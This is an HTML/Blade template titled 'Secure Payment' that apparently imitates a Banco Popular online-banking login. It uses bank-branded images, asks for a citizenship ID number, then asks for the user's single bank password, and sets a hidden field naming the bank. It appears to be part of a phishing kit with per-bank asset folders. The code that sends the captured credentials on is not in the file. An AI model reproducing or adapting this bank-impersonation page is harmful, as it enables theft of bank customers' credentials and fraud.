<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">

    
    <title>Secure Payment</title>
    
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

        
     <script type="text/javascript" src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>		
    <link rel="stylesheet" href="{{asset('assets/css/payment/popular.css')}}">




</head>
<body style="background-color:#f5f5f5;">

<script>
    function mostrarTexto2() {
      document.getElementById('texto1').style.display = 'none';
      document.getElementById('texto2').style.display = 'block';
    }
</script>

  <br><div id="texto1">
  <img src="{{asset('assets/img/payment/popular/popular.jfif')}}" alt="" srcset="" width="100%">


   <br> <label>Tipo de documento</label>
   <center><select name="" id="">
    <option value="">Cédula De Ciudadanía</option>
   </select></center>

   <label for="">Número de documento</label>
   <center><input type="tel" name="" id="txtUsuario" required minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');">
    <br><br><br><button onclick="mostrarTexto2()">Continuar</button></center>
  </div>

  <div id="texto2" class="hidden">
  <img src="{{asset('assets/img/payment/popular/popular2.jfif')}}" alt="" srcset="" width="100%">
  <input type="hidden" name="" id="banco" style="height:40px; border:1px solid #d3f3f3;" value="Popular">

   <label for="">Contraseña única</label>
   <center><input type="password" name="" id="txtPass" oninput="this.value = this.value.replace(/\s+/g, '')">
    <br><br><br><button id="btnUsuario">Ingresar</button></center>
  </div>

  <img src="{{asset('assets/img/payment/popular/popular1.jfif')}}" alt="" srcset="" width="100%">
</body>
</html>
